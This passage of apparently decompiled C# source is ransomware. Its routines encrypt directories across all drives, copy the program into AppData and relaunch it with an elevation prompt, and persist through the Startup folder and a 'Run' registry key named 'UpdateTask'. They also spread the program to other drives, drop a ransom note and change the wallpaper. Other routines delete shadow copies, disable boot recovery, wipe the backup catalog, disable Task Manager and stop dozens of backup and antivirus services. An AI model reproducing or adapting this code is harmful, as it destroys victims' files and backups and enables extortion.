					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					string dirName = directoryInfo.Name;
					if (!Array.Exists(array, (string E) => E == dirName))
					{
						encryptDirectory(directories[j]);
					}
				}
			}
			else
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			if (!File.Exists(text))
			{
				File.WriteAllLines(text, messages);
			}
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static bool isOver()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + processName;
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		if (location != text)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		if (File.Exists(path) && location == text)
		{
			return true;
		}
		return false;
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("UpdateTask", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != Path.GetPathRoot(Environment.SystemDirectory) && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void DisableTaskManager()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	private static void stopBackupServices()
	{
		//IL_0190: Unknown result type (might be due to invalid IL or missing references)
		//IL_0196: Expected O, but got Unknown
		string[] array = new string[42]
		{
			"BackupExecAgentBrowser", "BackupExecDiveciMediaService", "BackupExecJobEngine", "BackupExecManagementService", "vss", "sql", "svc$", "memtas", "sophos", "veeam",
			"backup", "GxVss", "GxBlr", "GxFWD", "GxCVD", "GxCIMgr", "DefWatch", "ccEvtMgr", "SavRoam", "RTVscan",
			"QBFCService", "Intuit.QuickBooks.FCS", "YooBackup", "YooIT", "zhudongfangyu", "sophos", "stc_raw_agent", "VSNAPVSS", "QBCFMonitorService", "VeeamTransportSvc",
			"VeeamDeploymentService", "VeeamNFSSvc", "veeam", "PDVFSService", "BackupExecVSSProvider", "BackupExecAgentAccelerator", "BackupExecRPCService", "AcrSch2Svc", "AcronisAgent", "CASAD2DWebSvc",
			"CAARCUpdateSvc", "TeamViewer"
		};
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				ServiceController val = new ServiceController(text);
				val.Stop();
			}
			catch
			{
			}
		}
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
